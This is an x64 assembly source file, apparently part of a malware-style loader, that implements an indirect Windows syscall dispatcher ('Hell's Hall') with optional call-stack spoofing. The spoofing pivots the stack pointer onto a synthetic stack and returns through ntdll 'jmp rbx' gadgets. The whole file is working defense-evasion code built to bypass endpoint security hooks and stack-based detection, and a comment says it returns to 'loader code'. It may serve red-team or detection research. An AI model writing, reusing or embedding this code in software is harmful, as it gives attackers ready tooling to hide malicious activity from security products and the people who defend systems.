; ==========================================================================
;  HellsHall.asm – Indirect syscall dispatcher with optional Call Stack Spoofing using SilentMoonwalk technique.
; ==========================================================================

.data
    g_SSN        DWORD 0
    g_Trampoline QWORD 0
    g_SpoofEnabled DWORD 0

    ALIGN 16
    g_SpoofSyntheticStack QWORD 32 DUP(0) ; 32 QWORDs for synthetic stack
    g_SpoofSavedRsp QWORD 0 ; RSP before pivot (after pushes)

.code
PUBLIC SetSyscallParams
PUBLIC HellsHallSyscall
PUBLIC g_SpoofEnabled
PUBLIC g_SpoofSyntheticStack
PUBLIC g_SpoofSavedRsp

; SetSyscallParams — stores SSN and trampoline address into module-level globals.

SetSyscallParams PROC
    mov [g_SSN], ecx           ; RCX = SSN
    mov [g_Trampoline], rdx    ; RDX = Trampoline
    ret
SetSyscallParams ENDP

; HellsHallSyscall — performs the indirect syscall using the stored SSN and trampoline address.
; Modified because of Call Stack Spoofing

HellsHallSyscall PROC
      ; Check if spoofing is enabled
      cmp [g_SpoofEnabled], 0
      jne SpoofPath

      ; Without spoofing, just do the normal indirect syscall dispatch
      mov eax, [g_SSN]
      mov r11, [g_Trampoline]
      mov r10, rcx          ; NT calling convention
      jmp r11

  SpoofPath:
      ; === Path with SilentMoonwalk RSP pivot ===
      ; Gadget 2 uses "jmp rbx" (FF E3) — more common in modern ntdll than "jmp r14".
      ; rbx is non-volatile so we save/restore it.

      push rbx

      ; Forward stack-based args (5..10) from the caller frame to the synthetic
      ; stack.  Windows x64 syscall convention reads the 5th arg at [rsp+0x28]
      ; at syscall-time; after the pivot rsp points inside the synthetic stack,
      ; so if we do not copy the args the kernel reads stack[5..10] (gadget
      ; addresses / zero) as arguments and returns STATUS_ACCESS_VIOLATION.
      ; At entry to HellsHallSyscall the caller's 5th arg is at [rsp+0x28];
      ; after `push rbx` it has moved to [rsp+0x30].
      mov  rax, [rsp + 30h]
      mov  qword ptr [g_SpoofSyntheticStack + 28h], rax
      mov  rax, [rsp + 38h]
      mov  qword ptr [g_SpoofSyntheticStack + 30h], rax
      mov  rax, [rsp + 40h]
      mov  qword ptr [g_SpoofSyntheticStack + 38h], rax
      mov  rax, [rsp + 48h]
      mov  qword ptr [g_SpoofSyntheticStack + 40h], rax
      mov  rax, [rsp + 50h]
      mov  qword ptr [g_SpoofSyntheticStack + 48h], rax
      mov  rax, [rsp + 58h]
      mov  qword ptr [g_SpoofSyntheticStack + 50h], rax

      ; rbx = address of AfterJmpPoint (target of the "jmp rbx" gadget)
      lea  rbx, AfterJmpPoint

      ; Save current RSP (after push rbx) to global slot
      mov  [g_SpoofSavedRsp], rsp

      ; Pivot RSP to synthetic stack — set RSP to gadget 1 position
      lea  rsp, g_SpoofSyntheticStack

      ; Dispatch syscall — trampoline will perform syscall; ret
      ; ret will jump to g_SpoofSyntheticStack[0] = add_rsp_gadget
      ; which will jump to jmp_rbx_gadget → jmp rbx → AfterJmpPoint
      mov  eax, [g_SSN]
      mov  r11, [g_Trampoline]
      mov  r10, rcx
      jmp  r11

      ; === Code after returning through jmp rbx ===
  AfterJmpPoint:
      ; Restore RSP to the value before the pivot
      mov  rsp, [g_SpoofSavedRsp]

      ; Restore non-volatile register and return to loader code
      pop  rbx
      ret

  HellsHallSyscall ENDP

  END
